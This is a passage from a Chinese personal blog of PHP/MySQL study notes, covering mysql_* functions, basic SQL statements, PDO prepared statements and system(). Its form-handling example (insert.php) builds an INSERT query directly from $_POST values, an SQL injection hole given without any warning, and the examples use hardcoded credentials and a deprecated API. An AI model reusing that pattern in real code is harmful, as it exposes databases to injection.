<h3 id="php-数据库"><a href="#php-数据库" class="headerlink" title="php 数据库"></a>php 数据库</h3><h4 id="连接到一个MySQL数据库"><a href="#连接到一个MySQL数据库" class="headerlink" title="连接到一个MySQL数据库"></a>连接到一个MySQL数据库</h4><ul>
<li><p><code>mysql_connect(servername,username,password);</code>建立连接<br>servername    可选。规定要连接的服务器。默认是 “localhost:3306”。<br>username    可选。规定登录所使用的用户名。默认值是拥有服务器进程的用户的名称。<br>password    可选。规定登录所用的密码。默认是 “”。</p>
</li>
<li><p><code>mysql_close() </code>关闭连接</p>
</li>
<li><p><code>mysql_error()</code>返回上一个 MySQL 操作产生的文本错误信息。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)<span class="comment">//如果连接失败，将执行die</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="创建数据库和表"><a href="#创建数据库和表" class="headerlink" title="创建数据库和表"></a>创建数据库和表</h4><ul>
<li><p><code>mysql_query(query, connection)</code></p>
<p>query必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</p>
<p>connection可选。如果未规定，则使用上一个打开的连接。</p>
</li>
<li><p>创建数据库的mysql语句<code>CREATE DATABASE database_name</code></p>
</li>
<li><p>选中进行操作的数据库<code>mysql_select_db(database,[connection]) </code></p>
</li>
<li><p>创建表的mysql语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type,</span><br><span class="line">column_name2 data_type,</span><br><span class="line">column_name3 data_type,</span><br><span class="line">.......</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
<li><p>创建数据库及表</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">  &#123;</span><br><span class="line"> 	 <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create database</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query(<span class="string">&quot;CREATE DATABASE my_db&quot;</span>,<span class="variable">$con</span>))</span><br><span class="line">  &#123;</span><br><span class="line"> 	 <span class="keyword">echo</span> <span class="string">&quot;Database created&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . mysql_error();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create table in my_db database</span></span><br><span class="line">mysql_select_db(<span class="string">&quot;my_db&quot;</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE Persons </span></span><br><span class="line"><span class="string">	(</span></span><br><span class="line"><span class="string">	FirstName varchar(15),</span></span><br><span class="line"><span class="string">	LastName varchar(15),</span></span><br><span class="line"><span class="string">	Age int</span></span><br><span class="line"><span class="string">	)&quot;</span>;</span><br><span class="line">mysql_query(<span class="variable">$sql</span>,<span class="variable">$con</span>);</span><br><span class="line"></span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="向表中插入记录Insert-Into"><a href="#向表中插入记录Insert-Into" class="headerlink" title="向表中插入记录Insert Into"></a>向表中插入记录Insert Into</h4><ul>
<li><p>向表中插入记录的sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (value1, value2,....)<span class="operator">/</span><span class="operator">/</span>按每一列的顺序自动插入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2,...)<span class="keyword">VALUES</span> (value1, value2,....)<span class="operator">/</span><span class="operator">/</span>只有特定列插入数据</span><br></pre></td></tr></table></figure></li>
<li><p>手动向表中添加记录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="string">&quot;my_db&quot;</span>, <span class="variable">$con</span>);</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;INSERT INTO Persons (FirstName, LastName, Age) </span></span><br><span class="line"><span class="string">VALUES (&#x27;Peter&#x27;, &#x27;Griffin&#x27;, &#x27;35&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;INSERT INTO Persons (FirstName, LastName, Age) </span></span><br><span class="line"><span class="string">VALUES (&#x27;Glenn&#x27;, &#x27;Quagmire&#x27;, &#x27;33&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>把来自表单的数据插入数据库</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//表单html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;insert.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">Firstname: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;firstname&quot;</span> /&gt;</span></span><br><span class="line">Lastname: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastname&quot;</span> /&gt;</span></span><br><span class="line">Age: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//insert.php文件 及表单提交处</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="string">&quot;my_db&quot;</span>, <span class="variable">$con</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO Persons (FirstName, LastName, Age) VALUES</span></span><br><span class="line"><span class="string">(&#x27;<span class="subst">$_POST</span>[firstname]&#x27;,&#x27;<span class="subst">$_POST</span>[lastname]&#x27;,&#x27;<span class="subst">$_POST</span>[age]&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mysql_query(<span class="variable">$sql</span>,<span class="variable">$con</span>))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;Error: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1 record added&quot;</span>;</span><br><span class="line"></span><br><span class="line">mysql_close(<span class="variable">$con</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单的数据会被发送到insert.php文件，php文件从$_POST变量中取表单提交的值</p>
</li>
</ul>
<h4 id="MYSQL-Select"><a href="#MYSQL-Select" class="headerlink" title="MYSQL Select"></a>MYSQL Select</h4><ul>
<li><p>在数据库中选取数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure></li>
<li><p><code>mysql_fetch_array(data)</code>这个函数从数据库的查询结果中获取一个数据行，如果查询没有得到任何数据，则返回false，需要参数为MySQL的查询语句。反复调用这个函数可以逐行读取数据</p>
</li>
<li><p>读取表中所有数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;peter&quot;</span>,<span class="string">&quot;abc123&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  	<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="string">&quot;my_db&quot;</span>, <span class="variable">$con</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="string">&quot;SELECT * FROM Persons&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))<span class="comment">//每次返回一行</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;FirstName&#x27;</span>] . <span class="string">&quot; &quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;LastName&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>在HTML表格中显示结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con = mysql_connect(&quot;localhost&quot;,&quot;peter&quot;,&quot;abc123&quot;);</span><br><span class="line">if (!$con)</span><br><span class="line">  &#123;</span><br><span class="line">  die(&#x27;Could not connect: &#x27; . mysql_error());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mysql_select_db(&quot;my_db&quot;, $con);</span><br><span class="line"></span><br><span class="line">$result = mysql_query(&quot;SELECT * FROM Persons&quot;);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;table border=&#x27;1&#x27;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Firstname&lt;/th&gt;</span><br><span class="line">&lt;th&gt;Lastname&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;&quot;;</span><br><span class="line"></span><br><span class="line">while($row = mysql_fetch_array($result))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;td&gt;&quot; . $row[&#x27;FirstName&#x27;] . &quot;&lt;/td&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;td&gt;&quot; . $row[&#x27;LastName&#x27;] . &quot;&lt;/td&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line"></span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>where</strong>可能用到的特殊操作符</p>
<p>​        <strong>between…And</strong></p>
<p>​        例：</p>
<table>
<thead>
<tr>
<th align="left">Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Adams</td>
<td align="left">John</td>
<td align="left">Oxford Street</td>
<td align="left">London</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Bush</td>
<td align="left">George</td>
<td align="left">Fifth Avenue</td>
<td align="left">New York</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Carter</td>
<td align="left">Thomas</td>
<td align="left">Changan Street</td>
<td align="left">Beijing</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">Gates</td>
<td align="left">Bill</td>
<td align="left">Xuanwumen 10</td>
<td align="left">Beijing</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> LastName</span><br><span class="line"><span class="keyword">BETWEEN</span> <span class="string">&#x27;Adams&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;Carter&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>结果为前两行</span><br></pre></td></tr></table></figure>

<p>​        <strong>Like</strong></p>
<p>​        例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\\选择N开头的</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;N%&#x27;</span></span><br><span class="line">\\选择g结尾的</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;%g&#x27;</span></span><br><span class="line">\\选择包含中间包含lon的</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">&#x27;%lon%&#x27;</span></span><br><span class="line">\\选择中间不包含lon的</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> City <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%lon%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​            </p>
</li>
</ul>
<h4 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h4><ul>
<li><p>sql语句中order by用法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name</span><br></pre></td></tr></table></figure></li>
<li><p>默认升序，DESC为降序 加在order by语句后面即可</p>
</li>
<li><p>根据多行进行排列，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name1, column_name2</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>仅当column_name1相同时才会使用column_name2</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="update-更新-修改数据库数据"><a href="#update-更新-修改数据库数据" class="headerlink" title="update 更新/修改数据库数据"></a>update 更新/修改数据库数据</h4><ul>
<li><p>update sql语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="keyword">SET</span> column_name <span class="operator">=</span> new_value</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="operator">=</span> some_value</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Delete-from数据库中的数据"><a href="#Delete-from数据库中的数据" class="headerlink" title="Delete from数据库中的数据"></a>Delete from数据库中的数据</h4><ul>
<li><p>delete sql语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="operator">=</span> some_value</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="PHP-PDO类"><a href="#PHP-PDO类" class="headerlink" title="PHP PDO类"></a>PHP PDO类</h3><p>PDO代表php和数据库之间的一个连接</p>
<h4 id="PDO构造函数："><a href="#PDO构造函数：" class="headerlink" title="PDO构造函数："></a>PDO构造函数：</h4><p>__constrcut(string $dsn,string $username,string $password)</p>
<h4 id="dsn-Data-Source-Name"><a href="#dsn-Data-Source-Name" class="headerlink" title="dsn(Data Source Name)"></a>dsn(Data Source Name)</h4><p>包含请求连接到数据库的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dsn = &#x27;mysql:host=localhost;dbname=testdb&#x27;</span><br></pre></td></tr></table></figure>



<h4 id="PDOStatement-fetch-fetch-style"><a href="#PDOStatement-fetch-fetch-style" class="headerlink" title="PDOStatement::fetch(fetch_style)"></a>PDOStatement::fetch(fetch_style)</h4><p>从结果集中返回下一行</p>
<p>fetch_style返回的方式</p>
<p>不设定的fetch_style，则使用默认PDO::ATTR_DEFAULT_FETCH_MODE 的值 （默认为 PDO::FETCH_BOTH ）</p>
<p>可<code>$pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);</code>用这种方法改变DEFAULT_FETCH_MODE 的值</p>
<ul>
<li><p><em>PDO::FETCH_ASSOC</em>：返回一个索引为 结果集列名 的数组</p>
</li>
<li><p><em>PDO::FETCH_BOTH</em>（默认）：返回一个索引为 结果集列名 和 以0开始的列号 的数组</p>
</li>
<li><p><em>PDO::FETCH_OBJ</em>：返回一个属性名对应结果集列名的匿名对象</p>
</li>
</ul>
<h4 id="PDO-query-string-statement"><a href="#PDO-query-string-statement" class="headerlink" title="PDO::query(string $statement)"></a>PDO::query(string $statement)</h4><p>执行 SQL 语句，以 PDOStatement 对象形式返回结果集</p>
<h4 id="PDO-prepare-string-statement"><a href="#PDO-prepare-string-statement" class="headerlink" title="PDO::prepare( string $statement )"></a>PDO::prepare( string $statement )</h4><p>准备要执行的SQL语句并返回一个 PDOStatement 对象</p>
<p>SQL语句可以包含零个或多个命名（:name）或问号（?）参数标记，参数在SQL执行时会被替换。</p>
<p>你不能在 SQL 语句中同时包含命名（:name）或问号（?）参数标记，只能选择其中一种风格。</p>
<p>预处理 SQL 语句中的参数在使用PDOStatement::execute()方法时会传递真实的参数。</p>
<h4 id="PDOStatement-execute-array-input-parameters"><a href="#PDOStatement-execute-array-input-parameters" class="headerlink" title="PDOStatement::execute ([ array $input_parameters ] )"></a>PDOStatement::execute ([ array $input_parameters ] )</h4><p>执行预处理过的语句，即将参数传到prepare中的语句并执行。</p>
<p>参数为prepare中参数标记对应的参数<strong>数组</strong></p>
<p>例子：</p>
<p>如果prepare中为Name params</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$calories = 150;</span><br><span class="line">$colour = &#x27;red&#x27;;</span><br><span class="line">$sth = $dbh-&gt;prepare(&#x27;SELECT name, colour, calories</span><br><span class="line">    FROM fruit</span><br><span class="line">    WHERE calories &lt; :calories AND colour = :colour&#x27;);</span><br><span class="line">$sth-&gt;execute([&#x27;:calories&#x27; =&gt; $calories, &#x27;:colour&#x27; =&gt; $colour]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如果prepare中为？即positional params</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$calories = 150;</span><br><span class="line">$colour = &#x27;red&#x27;;</span><br><span class="line">$sth = $dbh-&gt;prepare(&#x27;SELECT name, colour, calories</span><br><span class="line">    FROM fruit</span><br><span class="line">    WHERE calories &lt; ? AND colour = ?&#x27;);</span><br><span class="line">$sth-&gt;execute([$calories, $colour]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h4><p>输出相关变量的信息</p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>));</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">int</span>(<span class="number">2</span>) </span><br><span class="line">    [<span class="number">2</span>]=&gt; <span class="keyword">array</span>(<span class="number">3</span>) &#123; </span><br><span class="line">        [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span> </span><br><span class="line">        [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span> </span><br><span class="line">        [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;c&quot;</span> &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="gt-和-gt"><a href="#gt-和-gt" class="headerlink" title="=&gt;和-&gt;"></a>=&gt;和-&gt;</h4><p>-&gt;是对象执行方法/取得属性用的</p>
<p>=&gt;是数组里键值对应用的</p>
<h4 id="system-string-command-int-return-var"><a href="#system-string-command-int-return-var" class="headerlink" title="system(string $command [,int $return_var])"></a>system(string $command [,int $return_var])</h4><p>执行command参数所指定的命令</p>
<p>命令执行后的返回状态被设置到$return_var变量，值为0表示成功</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/17/xss-portswigger/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/17/xss-portswigger/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-17 16:25:39" itemprop="dateCreated datePublished" datetime="2021-09-17T16:25:39+08:00">2021-09-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
